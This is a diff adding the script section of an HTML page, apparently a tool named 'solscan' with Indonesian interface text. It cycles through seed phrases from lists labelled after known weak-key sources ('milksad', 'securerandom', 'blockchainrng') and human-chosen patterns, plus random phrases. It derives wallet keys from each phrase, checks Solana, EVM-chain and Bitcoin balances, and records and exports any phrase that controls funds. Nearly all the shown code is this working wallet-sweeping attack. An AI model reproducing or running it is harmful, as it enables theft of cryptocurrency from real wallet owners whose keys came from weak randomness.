+  securerandom:  { arr: null, idx: 0 },
+  blockchainrng: { arr: null, idx: 0 },
+};
+
+function shuffle(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    const t = arr[i]; arr[i] = arr[j]; arr[j] = t;
+  }
+  return arr;
+}
+
+function initQueue(colId) {
+  const srcMap = {
+    human:         HUMAN_PATTERNS,
+    milksad:       MILK_SAD_PHRASES,
+    securerandom:  SECURE_RANDOM_PHRASES,
+    blockchainrng: BLOCKCHAIN_RNG_PHRASES,
+  };
+  const src = srcMap[colId] || HUMAN_PATTERNS;
+  QUEUES[colId].arr = shuffle(src.slice());
+  QUEUES[colId].idx = 0;
+}
+
+function nextFromQueue(colId) {
+  const q = QUEUES[colId];
+  if (!q.arr || q.idx >= q.arr.length) {
+    initQueue(colId);
+    colLog(colId, "── cycle complete, reshuffled ──", "ll info");
+  }
+  return q.arr[q.idx++];
+}
+
+function getPhrase(colId) {
+  if (colId === "random")        return rndPhrase(parseInt(document.getElementById("wc-random").value));
+  if (colId === "human")         return nextFromQueue("human");
+  if (colId === "milksad")       return nextFromQueue("milksad");
+  if (colId === "securerandom")  return nextFromQueue("securerandom");
+  if (colId === "blockchainrng") return nextFromQueue("blockchainrng");
+  return rndPhrase(12);
+}
+
+function colLog(colId, msg, cls) {
+  cls = cls || "ll";
+  const box = document.getElementById("log-" + colId);
+  if (!box) return;
+  const el = document.createElement("div");
+  el.className = cls; el.textContent = msg;
+  box.appendChild(el);
+  if (box.children.length > 150) box.removeChild(box.firstChild);
+  box.scrollTop = box.scrollHeight;
+}
+
+function updateStats(colId) {
+  const s = COL[colId];
+  const el = s.t0 ? (Date.now() - s.t0) / 1000 : 1;
+  document.getElementById("tried-" + colId).textContent = s.tried.toLocaleString();
+  document.getElementById("hits-"  + colId).textContent = s.hits;
+  document.getElementById("rate-"  + colId).textContent = Math.round(s.tried / el) + "/s";
+  const total  = COL.random.tried + COL.human.tried + COL.milksad.tried + COL.securerandom.tried + COL.blockchainrng.tried;
+  const totalH = COL.random.hits  + COL.human.hits  + COL.milksad.hits  + COL.securerandom.hits  + COL.blockchainrng.hits;
+  const t0s    = [COL.random.t0, COL.human.t0, COL.milksad.t0, COL.securerandom.t0, COL.blockchainrng.t0].filter(Boolean);
+  const gel    = t0s.length ? (Date.now() - Math.min.apply(null, t0s)) / 1000 : 1;
+  document.getElementById("s-tried").textContent = total.toLocaleString();
+  document.getElementById("s-hits").textContent  = totalH;
+  document.getElementById("s-rate").textContent  = Math.round(total / gel) + "/s";
+}
+
+async function colTick(colId) {
+  const s = COL[colId];
+  if (!s.running) return;
+  const batch = Math.min(parseInt(document.getElementById("batchsize").value) || 2, 10);
+  const path  = document.getElementById("deriv-path").value;
+  const phrases = [];
+  for (let i = 0; i < batch; i++) phrases.push(getPhrase(colId));
+  phrases.forEach(function(p) { colLog(colId, "→ " + p.slice(0, 48) + "..."); });
+  const tasks = phrases.map(function(phrase) {
+    return (async function() {
+      try {
+        const kp     = await phraseToKeypair(phrase, path);
+        const pubkey = toBase58(kp.publicKey);
+        const lamps  = await getBalance(pubkey);
+        if (lamps > 0) return { phrase: phrase, pubkey: pubkey, sol: (lamps / 1e9).toFixed(9), col: colId };
+      } catch(e) {
+        if (e.message && e.message.includes("429")) {
+          colLog(colId, "429 rate limit — backoff 3s", "ll err");
+          await new Promise(function(r) { setTimeout(r, 3000); });
+        } else {
+          colLog(colId, "err: " + e.message, "ll err");
+        }
+      }
+      return null;
+    })();
+  });
+  s.tried += batch;
+  const results = await Promise.allSettled(tasks);
+  results.forEach(function(r) {
+    if (r.status === "fulfilled" && r.value) {
+      const h = r.value; s.hits++; globalHits++;
+      colLog(colId, "✓ SOL " + h.sol + "  " + h.pubkey.slice(0,20) + "...", "ll hit");
+      addHit(h);
+    }
+  });
+  // EVM scan — always on, parallel with Solana
+  const evmTasks = phrases.map(async function(phrase) {
+    try {
+      const evmHits = await checkEVMAllChains(phrase);
+      evmHits.forEach(function(eh) {
+        colLog(colId, "✓ EVM " + eh.chain + " " + eh.balance + " " + eh.symbol + "  " + eh.address.slice(0,16) + "...", "ll hit");
+        addHit({ pubkey: eh.address, sol: eh.balance + " " + eh.symbol + " (" + eh.chain + ")", phrase: phrase, col: colId, evm: true, explorer: eh.explorer });
+      });
+    } catch(e) {}
+  });
+  // BTC scan — P2PKH + P2WPKH + P2SH-P2WPKH, parallel with SOL+EVM
+  const btcTasks = phrases.map(async function(phrase) {
+    try {
+      const btcHits = await checkBTCAllTypes(phrase);
+      btcHits.forEach(function(bh) {
+        colLog(colId, "✓ BTC " + bh.type + " " + bh.btc + " BTC  " + bh.address.slice(0,16) + "...", "ll hit");
+        addHit({ pubkey: bh.address, sol: bh.btc + " BTC (" + bh.type + ")", phrase: phrase, col: colId, evm: true, explorer: bh.explorer });
+      });
+    } catch(e) {}
+  });
+  await Promise.allSettled([...evmTasks, ...btcTasks]);
+  updateStats(colId);
+  const delay = parseInt(document.getElementById("delay").value) || 400;
+  if (s.running) s.timer = setTimeout(function() { colTick(colId); }, delay);
+}
+
+function startCol(colId) {
+  const s = COL[colId];
+  s.running = true; s.t0 = Date.now(); s.tried = 0; s.hits = 0;
+  if (["human","milksad","securerandom","blockchainrng"].indexOf(colId) !== -1) initQueue(colId);
+  setColActive(colId, true);
+  document.getElementById("log-" + colId).innerHTML = "";
+  colLog(colId, "started", "ll info");
+  colTick(colId);
+}
+
+function stopCol(colId) {
+  COL[colId].running = false;
+  clearTimeout(COL[colId].timer);
+  setColActive(colId, false);
+  const s = COL[colId];
+  colLog(colId, "stopped  " + s.tried.toLocaleString() + " tried", "ll info");
+}
+
+function toggleCol(colId) {
+  if (!document.getElementById("helius-key").value.trim()) { alert("Isi Helius API key dulu"); return; }
+  if (COL[colId].running) stopCol(colId);
+  else startCol(colId);
+  document.getElementById("stopbtn").disabled = !Object.values(COL).some(function(c) { return c.running; });
+}
+
+function startAll() {
+  if (!document.getElementById("helius-key").value.trim()) { alert("Isi Helius API key dulu"); return; }
+  document.getElementById("hitsbox").innerHTML = "";
+  document.getElementById("hits-section").className = "hits-card";
+  globalHits = loadHits().length;
+  ["random","human","milksad","securerandom","blockchainrng"].forEach(function(id) { if (!COL[id].running) startCol(id); });
+  document.getElementById("startbtn").disabled = true;
+  document.getElementById("stopbtn").disabled  = false;
+}
+
+function stopAll() {
+  ["random","human","milksad","securerandom","blockchainrng"].forEach(function(id) { if (COL[id].running) stopCol(id); });
+  document.getElementById("startbtn").disabled = false;
+  document.getElementById("stopbtn").disabled  = true;
+}
+function exportHits() {
+  const hits = loadHits();
+  if (hits.length === 0) { alert("Belum ada hits"); return; }
+  const blob = new Blob([JSON.stringify(hits, null, 2)], {type: "application/json"});
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href = url; a.download = "solscan_hits_" + Date.now() + ".json";
+  a.click(); URL.revokeObjectURL(url);
+}
+
+function importHits() {
+  const input = document.createElement("input");
+  input.type = "file"; input.accept = ".json";
+  input.onchange = function(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = function(ev) {
+      try {
+        const imported = JSON.parse(ev.target.result);
+        if (!Array.isArray(imported)) { alert("Format tidak valid"); return; }
+        const existing = loadHits();
+        const existingKeys = new Set(existing.map(function(h) { return h.pubkey; }));
+        let added = 0;
+        imported.forEach(function(h) {
+          if (!existingKeys.has(h.pubkey)) {
+            existing.unshift(h);
+            seenPubkeys.add(h.pubkey);
+            added++;
+          }
+        });
+        saveHits(existing);
+        saveSeen();
+        restoreHits();
+        alert("Import selesai: " + added + " hits baru ditambahkan");
+      } catch(e) { alert("Error: " + e.message); }
+    };
+    reader.readAsText(file);
+  };
+  input.click();
+}
+
+function clearHistory() {
+  if (!confirm("Hapus semua history hits?")) return;
+  localStorage.removeItem("solscan_hits");
+  localStorage.removeItem("solscan_seen");
+  seenPubkeys.clear();
+  globalHits = 0;
+  document.getElementById("hitsbox").innerHTML = "";
+  document.getElementById("hits-section").className = "hits-card";
+  document.getElementById("hit-count").textContent = 0;
+}
+// restore on load
+window.addEventListener("DOMContentLoaded", function() { restoreHits(); });
+
+function loadHits() {
+  try {
+    return JSON.parse(localStorage.getItem("solscan_hits") || "[]");
+  } catch(e) { return []; }
+}
+function saveHits(hits) {
+  try { localStorage.setItem("solscan_hits", JSON.stringify(hits)); } catch(e) {}
+}
+function renderHit(h) {
+  const el = document.createElement("div");
+  el.className = "hit-item";
+  const pubDisplay = h.evm
+    ? '<a href="' + h.explorer + '" target="_blank" style="color:inherit">' + h.pubkey + '</a>'
+    : h.pubkey;
+  const amountLabel = h.evm ? h.sol : h.sol + ' SOL';
+  el.innerHTML = '<span class="hit-tag ' + h.col + '">' + (h.evm ? "evm" : h.col) + '</span>' +
+    amountLabel + '  ' + pubDisplay + '<br><small style="opacity:.6">' + h.phrase + '</small>';
+  return el;
+}
+function addHit(h) {
+  if (seenPubkeys.has(h.pubkey)) return;
+  seenPubkeys.add(h.pubkey);
+  saveSeen();
+  // save to hits list
+  const hits = loadHits();
+  hits.unshift(h);
+  saveHits(hits);
+  globalHits++;
+  document.getElementById("hits-section").className = "hits-card show";
+  document.getElementById("hit-count").textContent = globalHits;
+  document.getElementById("hitsbox").prepend(renderHit(h));
+}
+function restoreHits() {
+  const hits = loadHits();
+  if (hits.length === 0) return;
+  const box = document.getElementById("hitsbox");
+  box.innerHTML = "";
+  hits.forEach(function(h) { box.appendChild(renderHit(h)); });
+  globalHits = hits.length;
+  document.getElementById("hits-section").className = "hits-card show";
+  document.getElementById("hit-count").textContent = globalHits;
+}
+
+</script>
+</body>
+</html>
